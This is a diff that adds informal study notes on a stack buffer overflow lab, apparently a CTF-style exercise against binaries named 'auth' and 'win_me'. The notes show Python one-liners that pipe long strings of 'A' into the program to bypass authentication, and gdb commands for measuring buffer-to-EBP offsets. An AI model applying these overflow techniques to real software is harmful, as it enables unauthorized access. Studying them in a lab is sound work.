@@ -1,0 +1,34 @@
+First just run the program
+
+stack :
+
+	EBP
+	a
+	Buf
+
+we cant overrite anything below. Always LOW --> HIGH
+
+
+python3 -c 'print("A"*100)'
+>> python will execute the code like C does.
+
+python3 -c 'print("A"*69)' | ./auth
+>> 69 because buffer size
+
+python3 -c 'print("A"*100)' | ./auth)
+>> now I will be authenticated becasue of buffer overflow
+
+
+------------------
+
+>> gdb win_me
+gdb_peda>> disas vuln
+		>> b *(address where we want to break)
+		>> r
+		[from there we can see the adress of EBP] / >> p $ebp [another way to know the 	address of ebp]
+		>> p &buf [to know the address of buffer]
+		>> p/d higherAddress-lowerAddress
+		>> p win
+		[endian format -> little endians and big endians]
+
+>> 
